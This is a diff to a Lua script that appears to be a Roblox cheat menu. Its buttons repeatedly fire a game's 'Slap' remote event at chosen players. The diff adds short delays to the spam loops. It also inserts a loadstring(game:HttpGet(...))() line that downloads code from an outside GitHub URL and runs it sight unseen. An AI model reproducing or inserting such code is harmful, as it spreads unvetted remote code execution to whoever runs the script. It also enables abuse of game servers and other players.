@@ -230,7 +230,7 @@ local function UpdatePlayerlist()
 end
 
 UpdatePlayerlist()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielNov2014/flying/main/flying123.lua"))()
 slap.MouseButton1Click:Connect(function()
 	if player then
 		local targetPlayer = game:GetService("Players"):FindFirstChild(player)
@@ -268,6 +268,7 @@ _10xslap.MouseButton1Click:Connect(function()
 				}
 				for i = 1,10 do
 					game:GetService("Players").LocalPlayer.Character:WaitForChild("Slap"):WaitForChild("Event"):FireServer(unpack(args))
+					task.wait(0.2)
 				end
 			else
 				warn("Player found but character missing: "..targetPlayer.Name)
@@ -293,6 +294,7 @@ _100xslap.MouseButton1Click:Connect(function()
 				}
 				for i = 1,100 do
 					game:GetService("Players").LocalPlayer.Character:WaitForChild("Slap"):WaitForChild("Event"):FireServer(unpack(args))
+					task.wait(0.05)
 				end
 			else
 				warn("Player found but character missing: "..targetPlayer.Name)
